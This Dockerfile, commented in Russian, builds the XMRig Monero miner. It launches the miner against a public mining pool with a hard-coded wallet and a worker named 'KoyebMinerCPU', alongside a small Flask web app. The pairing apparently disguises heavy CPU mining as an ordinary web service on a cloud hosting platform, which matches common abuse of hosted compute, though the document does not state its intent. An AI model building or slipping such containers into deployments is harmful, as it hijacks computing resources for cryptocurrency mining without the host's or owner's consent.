FROM ubuntu:22.04

# Устанавливаем переменную окружения для избежания интерактивных запросов
ENV DEBIAN_FRONTEND=noninteractive

# Устанавливаем базовые пакеты и зависимости для CPU-майнинга
RUN apt-get update && apt-get install -y \
    git \
    build-essential \
    cmake \
    libuv1-dev \
    libssl-dev \
    libhwloc-dev \
    python3 \
    python3-pip \
    && apt-get clean

# Устанавливаем Flask и Waitress для Python
RUN pip3 install flask waitress

# Пытаемся включить huge pages
RUN sysctl -w vm.nr_hugepages=1280 || echo "Failed to set huge pages"

# Создаем рабочую директорию
WORKDIR /Tetroku

# Клонируем и собираем XMRig для CPU
RUN git clone https://github.com/xmrig/xmrig.git xmrig-cpu \
    && cd xmrig-cpu \
    && mkdir build \
    && cd build \
    && cmake .. \
    && make

# Копируем Python приложение
WORKDIR /Tetroku/xmrig-cpu/build
COPY app.py .

# Запускаем один майнер с оптимизированными настройками
CMD ./xmrig --url de.monero.herominers.com:1111 --user 4AsybUjHWc3LtcJj7h7yd9NJ3JXQynQUneMTpoTALYgmSFNW6XLmYGGLR5rHr3zcfjbPZ6dHp9MSdLiDBAXd4wKQ5ufR6vv.KoyebMinerCPU --pass x --threads 16 --cpu-max-threads-hint 80 --cpu-priority 5 --randomx-1gb-pages & \
    python3 app.py
